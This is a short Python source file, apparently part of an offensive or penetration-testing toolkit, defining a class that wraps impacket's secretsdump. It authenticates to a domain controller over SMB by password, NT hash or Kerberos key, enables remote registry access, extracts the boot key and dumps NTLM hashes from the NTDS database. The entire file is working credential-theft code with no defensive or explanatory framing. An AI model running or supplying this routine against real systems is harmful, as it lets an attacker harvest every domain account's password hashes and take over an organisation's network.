from libs.impacket.smbconnection import SMBConnection
from libs.impacket.examples.secretsdump import RemoteOperations, NTDSHashes


class DumpSecrets:
    def __init__(self, domain, username, password, nthash, aes_key, hostname, dc_ip, do_kerberos):
        self.domain = domain
        self.username = username
        self.password = password
        self.nthash = nthash
        self.aes_key = aes_key
        self.hostname = hostname
        self.dc_ip = dc_ip
        self.do_kerberos = do_kerberos
        self.smb_client = None
        self.remoteOps = None
        self.isRemote = True
        self.justDCNTLM = True

    def connect(self):
        if self.do_kerberos:
            self.smb_client = SMBConnection(self.hostname, self.dc_ip)
            self.smb_client.kerberosLogin(domain=self.domain, user=self.username, password=self.password, nthash=self.nthash, aesKey=self.aes_key, kdcHost=self.hostname, useCache=False)
        else:
            self.smb_client = SMBConnection(self.dc_ip, self.dc_ip)
            self.smb_client.login(domain=self.domain, user=self.username, password=self.password, nthash=self.nthash)
        return self.smb_client

    def dump(self):
        self.connect()
        self.remoteOps = RemoteOperations(self.smb_client, self.do_kerberos, kdcHost=self.hostname)
        self.remoteOps.enableRegistry()
        bootKey = self.remoteOps.getBootKey()

        NTDSFileName=None
        NTDSHashes(NTDSFileName, bootKey, isRemote=self.isRemote, remoteOps=self.remoteOps, justNTLM=self.justDCNTLM).dump()